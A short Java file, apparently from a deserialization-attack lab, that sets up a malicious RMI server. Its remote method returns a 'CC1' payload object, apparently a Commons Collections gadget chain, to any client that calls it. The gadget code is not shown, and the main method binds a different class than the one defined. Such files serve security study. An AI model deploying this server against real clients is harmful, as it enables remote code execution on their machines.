package org.example.server;

import org.example.payload.CC1;
import org.example.remoteInterface.DangeriousFunc2;

import java.net.MalformedURLException;
import java.rmi.Naming;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class getobjectServer extends UnicastRemoteObject implements DangeriousFunc2 {
    protected getobjectServer() throws RemoteException {
    }

    @Override
    public Object getAnytypeParams(Object obj) throws RemoteException {
        return CC1.getObject();
    }
    public static void main(String[] args) throws RemoteException, MalformedURLException {
        CmdServer cmdServer = new CmdServer();
        String host = "rmi://127.0.0.1:1099/";
        Naming.rebind(host+"Hello", cmdServer);
    }
}
